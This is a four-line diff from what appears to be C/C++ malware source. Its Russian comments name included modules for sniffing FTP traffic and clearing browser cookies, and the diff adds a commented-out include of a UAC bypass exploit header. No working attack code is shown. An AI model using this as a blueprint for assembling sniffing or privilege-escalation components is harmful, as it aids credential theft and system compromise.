@@ -21,3 +21,4 @@
 #include "FtpSniffer.h" // Перехват фтп трафика
 #include "coocksol.h" // Очистка куков ИЕ и ФФ
 
+//#include "Exploit\\UAC_bypass.h"
